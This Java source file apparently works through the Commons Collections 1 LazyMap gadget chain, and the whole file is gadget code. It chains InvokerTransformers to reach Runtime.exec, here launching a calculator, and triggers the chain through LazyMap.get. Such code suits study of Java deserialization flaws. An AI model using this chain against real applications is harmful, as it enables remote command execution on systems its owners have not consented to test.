package CC1LazyMap;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.util.HashMap;

public class LazyDecorateTest {
    public static void main(String[] args) throws Exception {
        HashMap<Object,Object>hashMap = new HashMap<>();
        String cmd = "/usr/bin/gnome-calculator";

        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer(
                        "getDeclaredMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null, null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{cmd}
                )
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);
//        lazyMap.get(Runtime.class);
        Class<LazyMap> LazyMapclass = LazyMap.class;
        Method lazyGetMethod = LazyMapclass.getDeclaredMethod("get", Object.class);
        lazyGetMethod.setAccessible(true);
        lazyGetMethod.invoke(lazyMap,Runtime.class);
    }

    public static void serialize(Object o) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(o);
    }
    public static Object deserialize(String fileName) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        return ois.readObject();
    }
}
